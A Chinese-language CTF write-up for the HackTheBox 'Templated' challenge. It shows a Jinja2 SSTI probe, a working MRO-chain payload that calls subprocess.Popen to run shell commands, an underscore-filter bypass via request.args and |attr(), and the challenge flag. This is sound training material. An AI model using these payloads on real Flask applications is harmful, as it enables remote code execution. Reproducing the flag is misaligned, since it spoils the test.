---
layout: writeup
lang: zh
title: "HackTheBox - Templated (SSTI to RCE)"
description: "Flask/Jinja2 应用中的服务端模板注入漏洞。通过属性访问链绕过基础过滤，实现远程代码执行并读取 root flag。"
platform: "HackTheBox"
category: "Web"
difficulty: "Easy"
date: 2026-02-14
permalink: /zh/ctf-writeups/htb-web-injection/
---

## 题目信息

**平台：** HackTheBox
**类别：** Web
**难度：** Easy

## 侦察

应用基本没有任何功能，只有一个路由将 URL 路径反射回页面。404 报错内容大致如下：

```
Error: /whatever was not found on this server
```

响应头中出现了 `Werkzeug/1.0.1`，说明后端是 Flask。推测页面内容通过 Jinja2 模板渲染，于是在 URL 中注入基础表达式：

```
GET /{{7*7}}
```

响应体返回 `49`，SSTI 确认。

## 漏洞利用

下一步是找到一个可以执行 shell 命令的类。在 Python 中，可以从任意字符串沿着 MRO 链一路找到 `object`，再列出所有子类，定位 `subprocess.Popen`：

```python
{{''.__class__.__mro__[1].__subclasses__()[OFFSET]('cat /flag.txt',shell=True,stdout=-1).communicate()}}
```

索引值因环境而异，逐个遍历子类直到找到可用的那个。

## 绕过过滤器

应用在 URL 中屏蔽了下划线，导致 payload 失效。解决方法是将属性名作为 GET 参数传入，完全避免在路径中出现下划线：

```
GET /{{request.args.c|attr(request.args.a)|attr(request.args.b)}}?c=''&a=__class__&b=__mro__
```

这种方式可以一路链接到 `communicate()`。

## Flag

```
HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}
```

## 总结

- Jinja2 中存在 SSTI 时，MRO 遍历是实现 RCE 的可靠路径
- 对 URL 路径中特定字符的过滤，可通过 `request.args` 配合 `|attr()` 绕过
- 响应头中的 Werkzeug 调试信息可以在模糊测试前帮助识别框架
